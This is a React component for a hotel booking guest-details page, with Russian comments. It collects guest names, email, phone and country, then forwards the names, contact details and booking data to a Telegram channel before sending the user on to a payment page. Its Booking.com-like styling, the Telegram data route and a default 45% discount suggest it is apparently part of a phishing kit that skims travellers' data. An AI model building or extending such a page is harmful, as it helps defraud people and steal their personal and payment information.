import React from 'react';
import { useNavigate } from 'react-router-dom';
import { sendTelegram } from './services/telegram';
// getCountryByIP больше не используется
import { useTranslation } from './hooks/useTranslation';

const BackIcon = () => (
  <svg width="24" height="24" fill="white" viewBox="0 0 24 24">
    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
  </svg>
);

const GuestInfo: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useTranslation();
  const [hotelBookingSummary, setHotelBookingSummary] = React.useState<any>(null);
  const [guests, setGuests] = React.useState<any[]>([]);
  const [contactInfo, setContactInfo] = React.useState({
    email: '',
    phone: '',
    country: '' // Пустое поле для ввода
  });
  const [errors, setErrors] = React.useState({
    guests: false,
    email: false,
    phone: false,
    phoneFormat: false
  });

  // Страна теперь вводится вручную, без определения по IP

  React.useEffect(() => {
    // Получаем данные отеля из sessionStorage
    const summary = sessionStorage.getItem('hotel_booking_summary');
    if (summary) {
      const parsed = JSON.parse(summary);
      setHotelBookingSummary(parsed);
      
      // Создаем массив гостей на основе количества взрослых и детей
      const adults = parsed.adults || 1;
      const children = parsed.children || 0;
      const guestsList = [];
      
      // Добавляем взрослых
      for (let i = 0; i < adults; i++) {
        guestsList.push({
          id: `adult_${i}`,
          type: 'Adult',
          firstName: '',
          lastName: '',
          age: null
        });
      }
      
      // Добавляем детей
      for (let i = 0; i < children; i++) {
        guestsList.push({
          id: `child_${i}`,
          type: 'Child',
          firstName: '',
          lastName: '',
          age: 12 // По умолчанию 12 лет
        });
      }
      
      setGuests(guestsList);
      
      // Не загружаем сохраненные данные - пользователь должен вводить заново
      // try {
      //   const savedGuests = localStorage.getItem('hotel_guests_info');
      //   const savedContact = localStorage.getItem('hotel_contact_info');
      //   if (savedGuests) {
      //     const parsedGuests = JSON.parse(savedGuests);
      //     setGuests(prevGuests => 
      //       prevGuests.map((guest, index) => ({
      //         ...guest,
      //         ...parsedGuests[index]
      //       }))
      //     );
      //   }
      //   if (savedContact) {
      //     setContactInfo(JSON.parse(savedContact));
      //   }
      // } catch {}
    }
  }, []);

  const updateGuest = (index: number, field: string, value: string) => {
    setGuests(prevGuests => 
      prevGuests.map((guest, i) => 
        i === index ? { ...guest, [field]: value } : guest
      )
    );
  };

  // Функция для фильтрации только английских букв
  const filterEnglishOnly = (value: string) => {
    return value.replace(/[^a-zA-Z\s]/g, '');
  };

  const updateContact = (field: string, value: string) => {
    setContactInfo(prev => ({ ...prev, [field]: value }));
  };

  // Проверяем, заполнены ли все обязательные поля
  const isFormValid = React.useMemo(() => {
    // Проверяем имена всех гостей
    const allGuestsFilled = guests.every(guest => 
      guest.firstName.trim() && guest.lastName.trim()
    );
    
    // Проверяем контактную информацию
    const contactFilled = contactInfo.email.trim() && 
                         contactInfo.phone.trim() && 
                         contactInfo.phone.startsWith('+') &&
                         contactInfo.country.trim();
    
    return allGuestsFilled && contactFilled;
  }, [guests, contactInfo]);

  const saveAndContinue = () => {
    // Сбрасываем ошибки
    setErrors({
      guests: false,
      email: false,
      phone: false,
      phoneFormat: false
    });
    
    // Проверяем, что все обязательные поля заполнены
    const allGuestsFilled = guests.every(guest => 
      guest.firstName.trim() && guest.lastName.trim()
    );
    
    if (!allGuestsFilled) {
      setErrors(prev => ({ ...prev, guests: true }));
      return;
    }
    
    if (!contactInfo.email.trim()) {
      setErrors(prev => ({ ...prev, email: true }));
      return;
    }
    
    if (!contactInfo.phone.trim()) {
      setErrors(prev => ({ ...prev, phone: true }));
      return;
    }
    
    // Проверяем формат телефона (должен начинаться с +)
    if (!contactInfo.phone.startsWith('+')) {
      setErrors(prev => ({ ...prev, phoneFormat: true }));
      return;
    }
    
    // Сохраняем данные
    try {
      localStorage.setItem('hotel_guests_info', JSON.stringify(guests));
      localStorage.setItem('hotel_contact_info', JSON.stringify(contactInfo));
      
      // Отладочная информация
      console.log('Saved guests data:', guests);
      console.log('Saved contact data:', contactInfo);
    } catch (error) {
      console.error('Error saving guest data:', error);
    }
    
    // Отправляем уведомление в Telegram
    const guestNames = guests.map(guest => `${guest.firstName} ${guest.lastName}`).join(', ');
    const message = `🏨 *Hotel Booking - Guest Information*\n\n` +
      `*Hotel:* ${hotelBookingSummary?.hotel_name || 'N/A'}\n` +
      `*Location:* ${hotelBookingSummary?.city || 'N/A'}\n` +
      `*Dates:* ${hotelBookingSummary?.checkIn} - ${hotelBookingSummary?.checkOut}\n` +
      `*Guests:* ${guestNames}\n` +
      `*Email:* ${contactInfo.email}\n` +
      `*Phone:* ${contactInfo.phone}\n` +
      `*Rooms:* ${hotelBookingSummary?.rooms || 1}\n\n` +
      `Guest information has been submitted successfully! ✅`;
    
    sendTelegram(message);
    
    navigate('/hotel/payment');
  };

  if (!hotelBookingSummary) {
    return (
      <div style={{ 
        display: 'flex', 
        justifyContent: 'center', 
        alignItems: 'center', 
        height: '100vh',
        color: 'white',
        fontSize: '18px'
      }}>
        {t('loadingHotelDetails')}
      </div>
    );
  }

  const adults = hotelBookingSummary.adults || 1;
  const children = hotelBookingSummary.children || 0;

  return (
    <div className="trav-page">
      <div className="trav-header">
        <button className="back-button" onClick={() => navigate(-1)}>
          <BackIcon />
        </button>
        <h1>{t('yourPersonalInfo')}</h1>
        <div style={{ width: 24 }} />
      </div>

      {/* Hotel Summary */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:16 }}>
          {t('bookingSummary')}
        </div>
        <div style={{ display:'flex', alignItems:'center', gap:12, padding:'16px', background:'#1f1f1f', borderRadius:12, border:'1px solid #333' }}>
          <div style={{ 
            width:64, 
            height:64, 
            borderRadius:8, 
            background:'#fff', 
            display:'flex', 
            alignItems:'center', 
            justifyContent:'center',
            overflow:'hidden',
            flexShrink:0
          }}>
            {hotelBookingSummary.photo ? (
              <img 
                src={hotelBookingSummary.photo} 
                alt={hotelBookingSummary.hotel_name}
                style={{
                  width:'100%',
                  height:'100%',
                  objectFit:'cover',
                  borderRadius:8
                }}
                onError={(e) => {
                  // Fallback к иконке если фото не загрузилось
                  const target = e.currentTarget as HTMLImageElement;
                  target.style.display = 'none';
                  const parent = target.parentElement;
                  if (parent) {
                    parent.innerHTML = `
                      <svg width="24" height="24" fill="#0071c2" viewBox="0 0 24 24">
                        <path d="M7 14c1.66 0 3-1.34 3-3S8.66 8 7 8s-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm12-3h-8v8H3V9H1v11h2v-2h18v2h2v-7c0-2.21-1.79-4-4-4z"/>
                      </svg>
                    `;
                  }
                }}
              />
            ) : (
              <svg width="24" height="24" fill="#0071c2" viewBox="0 0 24 24">
                <path d="M7 14c1.66 0 3-1.34 3-3S8.66 8 7 8s-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm12-3h-8v8H3V9H1v11h2v-2h18v2h2v-7c0-2.21-1.79-4-4-4z"/>
              </svg>
            )}
          </div>
          <div style={{ flex: 1 }}>
            <div style={{ color:'#fff', fontWeight:700, fontSize:16 }}>
              {hotelBookingSummary.hotel_name}
            </div>
            <div style={{ color:'#ccc', fontSize:14, marginTop:4 }}>
              {hotelBookingSummary.address} · {hotelBookingSummary.city}
            </div>
            <div style={{ color:'#ccc', fontSize:14, marginTop:2 }}>
              {hotelBookingSummary.checkIn && hotelBookingSummary.checkOut ? 
                `${new Date(hotelBookingSummary.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelBookingSummary.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 
                `${t('checkIn')} - ${t('checkOut')}`
              } · {hotelBookingSummary.rooms || 1} {(hotelBookingSummary.rooms || 1) === 1 ? t('room') : t('rooms')}
            </div>
          </div>
        </div>
      </div>

      {/* Guest Information */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:16 }}>
          {t('guestInformation')}
        </div>
        <div style={{ color:'#ccc', fontSize:14, marginBottom:20 }}>
          {adults} {adults === 1 ? t('adult') : t('adults')}{children > 0 ? ` · ${children} ${children === 1 ? t('child') : t('children')}` : ''}
        </div>
        
        <div style={{ display:'grid', gap:20 }}>
          {guests.map((guest, index) => (
            <div key={guest.id} style={{ 
              padding:'20px', 
              background:'#1f1f1f', 
              borderRadius:12, 
              border:'1px solid #333' 
            }}>
              <div style={{ 
                display:'flex', 
                alignItems:'center', 
                gap:12, 
                marginBottom:16 
              }}>
                <div style={{ 
                  width:32, 
                  height:32, 
                  borderRadius:'50%', 
                  background: guest.type === 'Adult' ? '#0071c2' : '#f39c12',
                  display:'flex', 
                  alignItems:'center', 
                  justifyContent:'center',
                  color:'white',
                  fontSize:14,
                  fontWeight:700
                }}>
                  {guest.type === 'Adult' ? 'A' : 'C'}
                </div>
                <div>
                  <div style={{ color:'#fff', fontWeight:700, fontSize:16 }}>
                    {guest.type === 'Adult' ? `${t('adultNumber')} ${index + 1}` : `${t('childNumber')} ${index - adults + 1}`}
                  </div>
                  {guest.type === 'Child' && (
                    <div style={{ color:'#ccc', fontSize:14 }}>
                      {t('ageLabel')} {guest.age} {t('yearsOld')}
                    </div>
                  )}
                </div>
              </div>
              
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
                <div>
                  <label style={{ 
                    display:'block', 
                    color:'#fff', 
                    fontWeight:600, 
                    fontSize:14, 
                    marginBottom:8 
                  }}>
                    {t('firstNameRequired')}
                  </label>
                  <input 
                    value={guest.firstName} 
                    onChange={e => updateGuest(index, 'firstName', filterEnglishOnly(e.target.value))}
                    placeholder={t('firstName')} 
                    style={{
                      width:'100%',
                      padding:'12px 16px',
                      background:'#2a2a2a',
                      border:'1px solid #444',
                      borderRadius:8,
                      color:'#fff',
                      fontSize:16,
                      outline:'none'
                    }}
                  />
                </div>
                <div>
                  <label style={{ 
                    display:'block', 
                    color:'#fff', 
                    fontWeight:600, 
                    fontSize:14, 
                    marginBottom:8 
                  }}>
                    {t('lastNameRequired')}
                  </label>
                  <input 
                    value={guest.lastName} 
                    onChange={e => updateGuest(index, 'lastName', filterEnglishOnly(e.target.value))}
                    placeholder={t('lastName')} 
                    style={{
                      width:'100%',
                      padding:'12px 16px',
                      background:'#2a2a2a',
                      border:'1px solid #444',
                      borderRadius:8,
                      color:'#fff',
                      fontSize:16,
                      outline:'none'
                    }}
                  />
                </div>
              </div>
            </div>
          ))}
        </div>
        {errors.guests && (
          <div style={{ color:'#ff6b6b', fontSize:12, marginTop:8 }}>
            {t('pleaseFillAllGuestNames')}
          </div>
        )}
      </div>

      {/* Contact Information */}
      <div className="section">
        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:16 }}>
          {t('contactDetails')}
        </div>
        
        <div style={{ display:'grid', gap:16 }}>
          <div>
            <label style={{ 
              display:'block', 
              color:'#fff', 
              fontWeight:600, 
              fontSize:14, 
              marginBottom:8 
            }}>
              {t('emailAddress')}
            </label>
            <input 
              value={contactInfo.email} 
              onChange={e => updateContact('email', e.target.value)}
              placeholder="you@example.com" 
              type="email"
              style={{
                width:'100%',
                padding:'12px 16px',
                background:'#2a2a2a',
                border:`1px solid ${errors.email ? '#ff6b6b' : '#444'}`,
                borderRadius:8,
                color:'#fff',
                fontSize:16,
                outline:'none'
              }}
            />
            {errors.email && (
              <div style={{ color:'#ff6b6b', fontSize:12, marginTop:4 }}>
                {t('emailAddressRequired')}
              </div>
            )}
          </div>
          
          <div>
            <label style={{ 
              display:'block', 
              color:'#fff', 
              fontWeight:600, 
              fontSize:14, 
              marginBottom:8 
            }}>
              {t('mobileNumberRequired')}
            </label>
            <input 
              value={contactInfo.phone} 
              onChange={e => updateContact('phone', e.target.value)}
              placeholder="+1234567890" 
              type="tel"
              style={{
                width:'100%',
                padding:'12px 16px',
                background:'#2a2a2a',
                border:`1px solid ${errors.phone || errors.phoneFormat ? '#ff6b6b' : '#444'}`,
                borderRadius:8,
                color:'#fff',
                fontSize:16,
                outline:'none'
              }}
            />
            <div style={{ color:'#999', fontSize:12, marginTop:4 }}>
              {t('enterInternationalNumber')}
            </div>
            {errors.phone && (
              <div style={{ color:'#ff6b6b', fontSize:12, marginTop:4 }}>
                {t('phoneNumberRequired')}
              </div>
            )}
            {errors.phoneFormat && (
              <div style={{ color:'#ff6b6b', fontSize:12, marginTop:4 }}>
                {t('phoneNumberMustStart')}
              </div>
            )}
          </div>
          
          <div>
            <label style={{ 
              display:'block', 
              color:'#fff', 
              fontWeight:600, 
              fontSize:14, 
              marginBottom:8 
            }}>
              {t('countryRegionRequired')}
            </label>
            <select 
              value={contactInfo.country} 
              onChange={e => updateContact('country', e.target.value)}
              style={{
                width:'100%',
                padding:'12px 16px',
                background:'#2a2a2a',
                border:'1px solid #444',
                borderRadius:8,
                color:'#fff',
                fontSize:16,
                outline:'none'
              }}
            >
              <option value="">{t('selectCountry')}</option>
              <option value="Afghanistan">Afghanistan</option>
              <option value="Albania">Albania</option>
              <option value="Algeria">Algeria</option>
              <option value="Argentina">Argentina</option>
              <option value="Armenia">Armenia</option>
              <option value="Australia">Australia</option>
              <option value="Austria">Austria</option>
              <option value="Azerbaijan">Azerbaijan</option>
              <option value="Bahrain">Bahrain</option>
              <option value="Bangladesh">Bangladesh</option>
              <option value="Belarus">Belarus</option>
              <option value="Belgium">Belgium</option>
              <option value="Brazil">Brazil</option>
              <option value="Bulgaria">Bulgaria</option>
              <option value="Cambodia">Cambodia</option>
              <option value="Canada">Canada</option>
              <option value="Chile">Chile</option>
              <option value="China">China</option>
              <option value="Colombia">Colombia</option>
              <option value="Croatia">Croatia</option>
              <option value="Cyprus">Cyprus</option>
              <option value="Czech Republic">Czech Republic</option>
              <option value="Denmark">Denmark</option>
              <option value="Egypt">Egypt</option>
              <option value="Estonia">Estonia</option>
              <option value="Finland">Finland</option>
              <option value="France">France</option>
              <option value="Georgia">Georgia</option>
              <option value="Germany">Germany</option>
              <option value="Greece">Greece</option>
              <option value="Hungary">Hungary</option>
              <option value="Iceland">Iceland</option>
              <option value="India">India</option>
              <option value="Indonesia">Indonesia</option>
              <option value="Iran">Iran</option>
              <option value="Iraq">Iraq</option>
              <option value="Ireland">Ireland</option>
              <option value="Israel">Israel</option>
              <option value="Italy">Italy</option>
              <option value="Japan">Japan</option>
              <option value="Jordan">Jordan</option>
              <option value="Kazakhstan">Kazakhstan</option>
              <option value="Kuwait">Kuwait</option>
              <option value="Latvia">Latvia</option>
              <option value="Lebanon">Lebanon</option>
              <option value="Lithuania">Lithuania</option>
              <option value="Luxembourg">Luxembourg</option>
              <option value="Malaysia">Malaysia</option>
              <option value="Malta">Malta</option>
              <option value="Mexico">Mexico</option>
              <option value="Morocco">Morocco</option>
              <option value="Netherlands">Netherlands</option>
              <option value="New Zealand">New Zealand</option>
              <option value="Norway">Norway</option>
              <option value="Oman">Oman</option>
              <option value="Pakistan">Pakistan</option>
              <option value="Philippines">Philippines</option>
              <option value="Poland">Poland</option>
              <option value="Portugal">Portugal</option>
              <option value="Qatar">Qatar</option>
              <option value="Romania">Romania</option>
              <option value="Russia">Russia</option>
              <option value="Saudi Arabia">Saudi Arabia</option>
              <option value="Singapore">Singapore</option>
              <option value="Slovakia">Slovakia</option>
              <option value="Slovenia">Slovenia</option>
              <option value="South Africa">South Africa</option>
              <option value="South Korea">South Korea</option>
              <option value="Spain">Spain</option>
              <option value="Sri Lanka">Sri Lanka</option>
              <option value="Sweden">Sweden</option>
              <option value="Switzerland">Switzerland</option>
              <option value="Thailand">Thailand</option>
              <option value="Turkey">Turkey</option>
              <option value="Ukraine">Ukraine</option>
              <option value="United Arab Emirates">United Arab Emirates</option>
              <option value="United Kingdom">United Kingdom</option>
              <option value="United States">United States</option>
              <option value="Vietnam">Vietnam</option>
            </select>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="luggage-footer">
        <div className="price-box">
          {hotelBookingSummary && (() => {
            const price = Number(hotelBookingSummary.totalWithTaxes || hotelBookingSummary.price || 0);
            const currency = String(hotelBookingSummary.currency || 'EUR');
            const promoDiscount = hotelBookingSummary.promoDiscount || null;
            const originalPrice = hotelBookingSummary.originalPrice || hotelBookingSummary.price || 0;
            
            return (
              <>
                {promoDiscount && originalPrice > price && (
                  <div style={{ marginBottom: 8, display: 'flex', flexDirection: 'column', gap: 4 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ color: '#999', fontSize: 13, textDecoration: 'line-through' }}>
                        {currency} {Number(originalPrice.toFixed(2))}
                      </span>
                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 2 }}>
                        <span style={{ color: '#00a884', fontSize: 13, fontWeight: 600 }}>
                          {t('youSave') || 'You save'} {currency} {Number(promoDiscount.discountAmount.toFixed(2))}
                        </span>
                        <span style={{ color: '#00a884', fontSize: 11, fontWeight: 500, opacity: 0.9 }}>
                          {promoDiscount.promoDiscountPercent || 45}% {t('discount') || 'discount'}
                          {promoDiscount.freeNights > 0 && ` + ${promoDiscount.freeNights} ${t('nightsFree') || 'nights free'}`}
                        </span>
                      </div>
                    </div>
                    {promoDiscount.appliedPromos.length > 0 && (
                      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                        {promoDiscount.appliedPromos.map((promo: string, idx: number) => (
                          <span key={idx} className="promo-badge-small">
                            {promo}
                          </span>
                        ))}
                      </div>
                    )}
                  </div>
                )}
                <div className="price-label">{currency} {Number(price.toFixed(2))}</div>
                <div className="price-sub">{t('includesTaxesAndFeesLabel')}</div>
              </>
            );
          })()}
        </div>
        <button 
          className="next-button" 
          onClick={saveAndContinue}
          disabled={!isFormValid}
          style={{
            background: isFormValid ? '#0071c2' : '#666',
            color: isFormValid ? 'white' : '#999',
            border:'none',
            borderRadius:8,
            padding:'16px 24px',
            fontSize:16,
            fontWeight:700,
            cursor: isFormValid ? 'pointer' : 'not-allowed',
            opacity: isFormValid ? 1 : 0.6,
            transition:'background 0.2s'
          }}
          onMouseOver={(e) => {
            if (isFormValid) {
              e.currentTarget.style.background = '#005a9e';
            }
          }}
          onMouseOut={(e) => {
            if (isFormValid) {
              e.currentTarget.style.background = '#0071c2';
            }
          }}
        >
          {t('continue')}
        </button>
      </div>
    </div>
  );
};

export default GuestInfo;


